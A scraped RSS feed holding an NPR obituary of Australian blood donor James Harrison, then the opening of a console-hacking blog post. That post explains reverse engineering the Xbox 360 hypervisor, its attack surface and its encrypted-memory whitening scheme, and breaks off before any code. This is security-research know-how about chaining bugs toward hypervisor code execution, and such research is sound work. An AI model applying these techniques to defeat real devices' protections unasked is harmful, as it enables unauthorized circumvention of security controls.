https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/1800/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 1800w" data-template="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/{width}/quality/{quality}/format/{format}/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg" sizes="(min-width: 1300px) 763px, (min-width: 1025px) calc(100vw - 496px), (min-width: 768px) calc(100vw - 171px), calc(100vw - 30px)" type="image/webp">
            <source srcset="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/400/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 400w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/600/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 600w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/800/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 800w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/900/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 900w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/1200/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 1200w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/1600/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 1600w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/1800/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 1800w" data-template="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/{width}/quality/{quality}/format/{format}/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg" sizes="(min-width: 1300px) 763px, (min-width: 1025px) calc(100vw - 496px), (min-width: 768px) calc(100vw - 171px), calc(100vw - 30px)" type="image/jpeg">
            <img src="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/1100/quality/50/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg" data-template="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/{width}/quality/{quality}/format/{format}/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg" alt="A man looks at a woman holding a baby while he sits on a recliner giving blood." fetchpriority="high">
        </picture>
</div>
<div>
    <div>
        <p>
                James Harrison looks at 8-month-old Layla and her mother, Beth Ismay, in Sydney, Australia, in May 2018. It was the last time Harrison donated blood.
                <b aria-label="Image credit">
                    
                    Subel Bhandari/Picture Alliance via Getty Images
                    
                </b>
                <b><b>hide caption</b></b>
            </p>


            <p><b><b>toggle caption</b></b>
    </p></div>

    <p><span aria-label="Image credit">
        
        Subel Bhandari/Picture Alliance via Getty Images
        
    </span>
</p></div>
   </div>
   <p>Australia's most prolific blood and plasma donor, James Harrison, has died at age 88. Known as the "Man with the Golden Arm," Harrison is credited with saving the lives of 2.4 million babies over the course of more than half a century.</p>   
   
<!-- END ID="RESNX-S1-5316163-100" CLASS="BUCKETWRAP INTERNALLINK INSETTWOCOLUMN INSET2COL " -->
   <p>Harrison died "peacefully in his sleep" at a nursing home on Feb. 17, Lifeblood — the Australian Red Cross branch responsible for blood donations — <a href="https://www.lifeblood.com.au/news-and-stories/media-centre/media-releases-and-statements/vale-james-harrison-oam" target="_blank">announced on Saturday</a>.</p>   <p>Harrison donated blood and plasma a whopping 1,173 times, according to Lifeblood, every two weeks between 1954 and 2018. All but 10 were from his right arm, the <a href="https://www.npr.org/sections/thetwo-way/2018/05/14/611074956/australias-man-with-the-golden-arm-retires-after-saving-2-4-million-babies" target="_blank"><em>Sydney Morning Herald</em></a> reported.</p>   <p>He "never missed a single appointment," the agency said, and "expected nothing in return." Blood donors are not compensated financially under <a href="https://www.health.gov.au/topics/blood-and-blood-products/what-were-doing-about-blood-and-blood-products" target="_blank">Australian law</a>.</p>   <p>"James was a remarkable, stoically kind, and generous person who was committed to a lifetime of giving and he captured the hearts of many people around the world," Lifeblood CEO Stephen Cornelissen said in a statement. </p>   
   <p>Harrison's plasma contained a rare and precious <a href="https://www.lifeblood.com.au/blood/learn-about-blood/plasma/anti-D" target="_blank">antibody called anti-D</a>, which was discovered in the mid-1960s. It is used in medications to prevent haemolytic disease of the fetus and newborn (HDFN) — also known as rhesus disease — a potentially fatal disease that occurs when a pregnant person's blood is incompatible with that of their unborn baby, prompting their immune system to attack it.</p>   
   
<!-- END ID="RESNX-S1-5316163-101" CLASS="BUCKETWRAP INTERNALLINK INSETTWOCOLUMN INSET2COL " -->
   <p>According to Lifeblood, 17% of Australian women who become pregnant end up needing anti-D injections — and most of the country's supply comes from a pool of less than 200 regular plasma donors.</p>   <p>Harrison became the country's first and most prolific anti-D donor, according to Lifeblood. In 1999, he received the Medal of the Order of Australia, one of the country's highest civilian honors. But he downplayed his accomplishments in interviews throughout the years, urging others to roll up their sleeves too.</p>   <p>"Some people say, 'Oh, you're a hero,' " <a href="https://www.npr.org/2015/06/14/414397424/man-with-the-golden-arm-donates-blood-thats-saved-2-million-babies" target="_blank">Harrison told NPR</a> in 2015. "But I'm in a safe room, donating blood. They give me a cup of coffee and something to nibble on. And then I just go on my way. … No problem, no hardship."<br></p>   <h3>Harrison started donating to repay others' generosity</h3>   <div id="resg-s1-51766">
            <div data-crop-type="">
        <picture>
            <source srcset="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/400/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 400w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/600/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 600w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/800/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 800w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/900/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 900w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/1200/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 1200w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/1600/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 1600w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/1800/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 1800w" data-template="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/{width}/quality/{quality}/format/{format}/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg" sizes="(min-width: 1300px) 763px, (min-width: 1025px) calc(100vw - 496px), (min-width: 768px) calc(100vw - 171px), calc(100vw - 30px)" type="image/webp">
            <source srcset="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/400/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 400w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/600/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 600w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/800/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 800w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/900/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 900w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/1200/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 1200w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/1600/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 1600w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/1800/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 1800w" data-template="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/{width}/quality/{quality}/format/{format}/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg" sizes="(min-width: 1300px) 763px, (min-width: 1025px) calc(100vw - 496px), (min-width: 768px) calc(100vw - 171px), calc(100vw - 30px)" type="image/jpeg">
            <img src="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/1100/quality/50/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg" data-template="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/{width}/quality/{quality}/format/{format}/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg" alt="Harrison holds an index card documenting his blood donations in the 1960s." loading="lazy">
        </picture>
</div>
<div>
    <div>
        <p>
                At his last blood donation in 2018, James Harrison shows a card documenting his earlier donations.
                <b aria-label="Image credit">
                    
                    Subel Bhandari/picture alliance via Getty Images
                    
                </b>
                <b><b>hide caption</b></b>
            </p>


            <p><b><b>toggle caption</b></b>
    </p></div>

    <p><span aria-label="Image credit">
        
        Subel Bhandari/picture alliance via Getty Images
        
    </span>
</p></div>
   </div>
   <p>When Harrison was 14, he got sick and had to have one of his lungs removed.</p>   
   <p>The grueling process involved a three-month hospital stay, 100 stitches and nearly two gallons of donated blood, <a href="https://www.npr.org/2015/06/14/414397424/man-with-the-golden-arm-donates-blood-thats-saved-2-million-babies" target="_blank">he told NPR</a>. It inspired him to donate his own later — despite his <a href="https://www.lifeblood.com.au/news-and-stories/stories/james-harrison" target="_blank">aversion to needles</a>.</p>   <p>"I was always looking forward to donating, right from the operation, because I don't know how many people it took to save my life," he said. "I never met them, didn't know them."</p>   
   
<!-- END ID="RESNX-S1-5316163-102" CLASS="BUCKETWRAP INTERNALLINK INSETTWOCOLUMN INSET2COL " -->
   <p>In 1954, as soon as he hit the legal age of 18, Harrison started giving blood and plasma.</p>   <p>Scientists discovered the anti-D treatment for HDFN about a decade later, and Harrison soon learned his blood contained the rare life-saving antibody — which doctors believe has to do with the blood he received years earlier.</p>   <p>Once Harrison learned he possessed anti-D, <a href="https://www.lifeblood.com.au/news-and-stories/stories/james-harrison" target="_blank">Lifeblood says</a> he was "happy to continue to donate and switch over to plasma donation in order to help as many people as possible."</p>   <p>"I was prepared and wanted to give something back," Harrison said. "And I've been donating for 60 years."</p>   <p>Lifeblood says more than 3 million doses of anti-D containing Harrison's blood have been issued to Australian mothers since 1967. That long list of recipients includes members of his own family.<br></p>   <h3>His donations helped grow and inspire his own family</h3>   <p>Harrison's daughter, Tracey Mellowship, was among the women who received the injection while pregnant.</p>   <p>"As an anti-D recipient myself, he has left behind a family that may not have existed without his precious donations," she said in a statement, adding that her dad was "immensely proud" to have welcomed two great-grandchildren in his final years.</p>   <p>Harrison's contributions didn't just enable his family to grow, but to give back themselves.</p>   <p>"The whole family are blood donors," Harrison told NPR. "And that makes you feel proud, too."</p>   
   
<!-- END ID="RESNX-S1-5316163-103" CLASS="BUCKETWRAP INTERNALLINK INSETTWOCOLUMN INSET2COL " -->
   <p>In 2011, his grandson Scott made his first donation — seated right next to Harrison, who was making his 1,000th.</p>   <p>His late wife Barbara was a blood donor as well. Harrison kept donating "even in his darkest days," including after her death, Lifeblood says.</p>   <p>Mellowship said her dad was proud to have saved so many lives "without any cost or pain."</p>   <p>"It made him happy to hear about the many families like ours, who existed because of his kindness," Mellowship said. "He always said it does not hurt, and the life you save could be your own."</p>   <div id="resg-s1-51765">
            <div data-crop-type="">
        <picture>
            <source srcset="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/400/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 400w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/600/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 600w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/800/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 800w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/900/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 900w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/1200/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 1200w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/1600/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 1600w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/1800/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 1800w" data-template="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/{width}/quality/{quality}/format/{format}/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg" sizes="(min-width: 1300px) 763px, (min-width: 1025px) calc(100vw - 496px), (min-width: 768px) calc(100vw - 171px), calc(100vw - 30px)" type="image/webp">
            <source srcset="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/400/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 400w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/600/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 600w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/800/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 800w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/900/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 900w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/1200/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 1200w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/1600/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 1600w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/1800/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 1800w" data-template="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/{width}/quality/{quality}/format/{format}/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg" sizes="(min-width: 1300px) 763px, (min-width: 1025px) calc(100vw - 496px), (min-width: 768px) calc(100vw - 171px), calc(100vw - 30px)" type="image/jpeg">
            <img src="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/1100/quality/50/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg" data-template="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/{width}/quality/{quality}/format/{format}/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg" alt="A black and white photo of Harrison giving blood." loading="lazy">
        </picture>
</div>
<div>
    <div>
        <p>
                James Harrison, pictured giving his 537th blood donation in December 1992.
                <b aria-label="Image credit">
                    
                    Simon Alekna/Fairfax Media Archive via Getty Images
                    
                </b>
                <b><b>hide caption</b></b>
            </p>


            <p><b><b>toggle caption</b></b>
    </p></div>

    <p><span aria-label="Image credit">
        
        Simon Alekna/Fairfax Media Archive via Getty Images
        
    </span>
</p></div>
   </div>
   <h3>He continues to advance scientific research</h3>   <p>Harrison <a href="https://www.npr.org/sections/thetwo-way/2018/05/14/611074956/australias-man-with-the-golden-arm-retires-after-saving-2-4-million-babies" target="_blank">officially retired</a> at age 81, the <a href="https://www.lifeblood.com.au/faq/eligibility/other/age" target="_blank">maximum age</a> for blood donations under Australian law.</p>   
   <p>He made his last donation in May 2018, surrounded by half a dozen grateful mothers holding babies who benefited from the anti-D program.</p>   <p>From the blood center recliner, Harrison bemoaned his forced retirement, telling the<em> </em><a href="https://www.smh.com.au/healthcare/final-donation-for-man-whose-blood-helped-save-2-4-million-babies-20180511-p4zerp.html" target="_blank"><em>Sydney Morning Herald</em></a> that "I'd keep on going if they let me."</p>   <p>But he also spoke optimistically about passing the baton — or, more accurately, the squishy stress ball.</p>   <p>"I hope it's a record that somebody breaks, because it will mean they are dedicated to the cause," he said.</p>   
   
<!-- END ID="RESNX-S1-5316163-104" CLASS="BUCKETWRAP INTERNALLINK INSETTWOCOLUMN INSET2COL " -->
   <p>Australia has about 200 anti-D donors who help around 45,000 mothers and babies annually, according to Lifeblood.</p>   <p>But because the antibody is so rare, and there are so few human donors able to donate regularly, scientists are also trying to come up with a synthetic version.</p>   <p>Lifeblood is working with Walter and Eliza Hall Institute of Medical Research (WEHI), Australia's oldest research institute, on a project they call "James in a Jar." It could see Harrison continue to save lives long after his death.</p>   <p>"Using the blood of James and other donors, the team has successfully recreated and grown his antibody in the lab — with the hope it will one day help prevent [HDFN], not just for pregnant women in Australia, but also worldwide," it says.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Hacking the Xbox 360 Hypervisor Part 2: The Bad Update Exploit (118 pts)]]></title>
            <link>https://icode4.coffee/?p=1081</link>
            <guid>43244739</guid>
            <pubDate>Mon, 03 Mar 2025 18:06:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://icode4.coffee/?p=1081">https://icode4.coffee/?p=1081</a>, See on <a href="https://news.ycombinator.com/item?id=43244739">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
									
									
<p>Welcome to part 2 of the Hacking the Xbox 360 Hypervisor blog series. In this part I’ll cover how I found and exploited bugs in the Xbox 360 hypervisor to get full code execution and create the “Bad Update” exploit. If you haven’t already, I highly recommend you read (or at least skim through) <a href="https://icode4.coffee/?p=1047" data-type="post" data-id="1047" target="_blank" rel="noreferrer noopener">part 1</a> as this post will reference a lot of the material discussed there.</p>



<p>As I mentioned in part 1, I consider the Xbox 360 hypervisor to be one of the most secure pieces of code Microsoft has ever written, with only one software bug to date that was likely the result of a compiler issue. I spent a lot of time in the past looking for vulnerabilities in the hypervisor but never found anything of significance. Since then, I’ve spent 7 years working as a security engineer professionally and had developed a whole new mindset for how I analyze targets and find bugs. I was very motivated to put my new skills to the test and see if I could finally hack the Xbox 360 hypervisor. This is what I considered “the final boss” of my journey as a game console hacker.</p>



<h2>Testing Environment</h2>



<p>My goal was to exploit a game save bug I found in <a href="https://icode4.coffee/?p=954#xbox-36-exploit" data-type="post" data-id="954" target="_blank" rel="noreferrer noopener">Tony Hawk’s American Wasteland</a> to start an exploit chain that would hopefully end with me getting hypervisor mode code execution. My testing environment for doing this research consisted of an already modified Xbox 360 console that had full debugging capabilities. This allowed me to write exploit tests in C code which I could run and debug on the console, while also being able to introspect the internal state of the hypervisor. I wanted to focus my efforts on determining if any bugs I found were actually exploitable, and writing the exploit tests in C code that I could debug was the fastest way to do this. Once I had a viable exploit I could worry about triggering it from the Tony Hawk game save bug.</p>



<h2>Analyzing Attack Surface</h2>



<p>In part 1 I talked a bit about the <a href="https://icode4.coffee/?p=1047#system-calls" data-type="post" data-id="1047" target="_blank" rel="noreferrer noopener">system call attack surface</a> the hypervisor exposes to kernel mode. I looked through many of the system calls nearly 15 years ago when I first started researching the console but never found anything noteworthy. However, now that I had a new mindset for bug hunting it was time to look through all of the available attack surface starting fresh. Due to how little attack surface there is in the Xbox 360 hypervisor I decided on “code review” for my method of finding bugs. It didn’t really make sense to try and write a fuzzer or emulation harness and would have been way more work than just doing code review anyway. I say “code review” here because I don’t actually have access to the source code and what I’m really doing is reverse engineering/analyzing the disassembly of the hypervisor binary in IDA.</p>



<p>In my first pass of “code review” I’d be looking for “trivial” bugs, things like out of bounds reads/writes, race conditions/lack of locking, time of check/time of use bugs, integer overflows/underflows, missed validation of parameters, etc. I call these “trivial” because many of these can be exploitable without any additional primitives and don’t require a complex attack scenario.</p>



<h3>System Calls</h3>



<p>At launch the hypervisor had 65 system calls which increased to 120 by the end of its lifecycle, nearly doubling the amount of attack surface it exposed to kernel mode. The hypervisor system calls can be called by any code in kernel mode at any time and provide a range of functionality to support the console OS. The system call attack surface is very secure and has thorough validation of all parameters, only operates on data in protected memory and performs signature checks on most forms of data that involve parsing logic. While there were a few system calls that had notable or interesting behavior (things like cache flushing primitives, arbitrary writes to unprotected memory, etc.) I didn’t find anything that could be used to try and attack the hypervisor itself.</p>



<h3>XeKeysExecute Payloads</h3>



<p>There’s a special system call called <code>HvxKeysExecute</code> that’s used for running small pieces of ad-hoc code in hypervisor mode. This system call takes in a XeKeysExecute (XKE) payload which is a small piece of code signed by Microsoft that the hypervisor will load and execute dynamically. These payloads typically perform a single operation like update or validate some encrypted security file or provide a way for Microsoft to ship anti-cheat payloads through Xbox Live. XKE payloads are good attack surface because they perform non-standard ad-hoc operations, typically take in parameters and data from kernel mode to operate on, and typically have no version or runtime checks that prevent you from running them out of band. Put simply: any executable (game, dashboard, or otherwise) can typically run these at any time on any system software version.</p>



<p>These payloads are most commonly used by system update executables to perform additional security operations when updating the console. I leveraged this to my advantage and downloaded around ~85 system update packages I <a href="https://digiex.net/forums/dashboard-system-updates.62/">found online</a> to help build a collection of payloads for analysis. After writing some scripts to extract the update files and scan them for XKE payloads I had around 25 XKE payloads for analysis. Unfortunately, I didn’t find any trivial bugs in them. There was one payload that stood out as having some interesting behavior that could be exploitable but required I had a way to attack <a href="https://icode4.coffee/?p=1047#encrypted-memory" data-type="post" data-id="1047" target="_blank" rel="noreferrer noopener">encrypted memory</a>. Since I didn’t have any way to do this just yet I made note of the payload and moved on.</p>



<h3>Findings (none)</h3>



<p>I wasn’t hopeful I would find any fruitful results in this first pass and to be honest I would’ve been disappointed if I did. After a few days of code review on the attack surface available I had found nothing notable, which was to be expected. However, this did allow me to learn more about how encrypted and protected memory worked which gave me a few ideas for possible attack vectors. Faced with a lack of attack surface it was time to think outside the box and see if I could “create” more attack surface.</p>



<h2 id="attacking-encrypted-memory">Attacking Encrypted Memory</h2>



<p>With no bugs found the next thing I turned to was trying to attack encrypted memory as this would allow me to try and attack the notable XKE payload I found earlier. Since encrypted memory doesn’t have any CRC checksums it can be modified from outside of the hypervisor, but I’d need to find a way to craft the ciphertext for data I wanted to write. Encrypted memory is typically used in a “write-only” fashion by the hypervisor. It’s clear Microsoft was aware it could be modified by kernel mode and therefore almost never read back from encrypted memory and operate on it. However, this notable XKE payload was doing just that and seemed like it could lead to some exploitable bugs in hypervisor mode.</p>



<p>Attacking this notable XKE payload was going to be difficult so I decided it would be best to first find an easier target and prove I could successfully attack encrypted memory without worrying about extraneous variables. There are only a few things that are stored in encrypted memory, mainly all kernel mode code, as well as&nbsp;some security related data that’s shared between the hypervisor and kernel (revocation lists, kernel&nbsp;mode RNG state, etc.). Attacking the encrypted memory for some kernel mode code seemed like a good test candidate as I could overwrite it with my own assembly code to do something like change the console’s LED colors, thus proving the attack worked.</p>



<h2>Encrypted Memory Allocations</h2>



<p>Both the protected and encrypted memory pathways perform encryption by mixing together a 10-bit whitening value, a per-boot per-pathway encryption key, and the address of cache line containing the memory being accessed. This prevents attackers from trying ciphertext manipulation attacks such:</p>



<ul>
<li>Using ciphertext from address A at address B where A != B.</li>



<li>Using ciphertext from the protected pathway with the encrypted pathway (or vice versa).</li>



<li>Using ciphertext across resets/reboots of the CPU.</li>
</ul>



<p>The hypervisor manages a table of values that I’ll refer to as the “page whitening table” which tracks encrypted pages of memory (on a 64KB granularity) and what whitening values have already been used on those pages. Every time the hypervisor allocates a page of memory for the encrypted pathway it’ll call a function I’ve named “HvpSetPageWhiteningBits”. This function will check the page whitening table to determine the next whitening value to use for the page. When the console boots, all entries are initialized to 0 and each time a page of encrypted memory is allocated the whitening value will be incremented by 1 until it reaches 1024 (the point at which a 10-bit integer would overflow). At this point an overflow bit will be set which indicates all possible whitening values have been used exactly once. Any allocation of the page thereafter will use a randomly generated number for the whitening value. The pseudo code for this function can be seen below:</p>



<div id="urvanov-syntax-highlighter-67c61f5b71657905577838" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="show">
